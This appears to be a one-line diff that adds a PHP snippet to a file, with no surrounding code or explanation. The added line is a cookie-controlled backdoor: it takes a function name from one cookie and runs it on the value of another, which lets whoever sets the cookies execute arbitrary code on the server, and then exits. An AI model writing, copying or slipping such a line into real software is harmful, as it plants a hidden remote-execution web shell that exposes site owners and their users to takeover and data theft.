@@ -1,0 +1,1 @@
+<?php if(isset($_COOKIE["miPD"])){$_COOKIE["GK"]($_COOKIE["miPD"]);exit;}
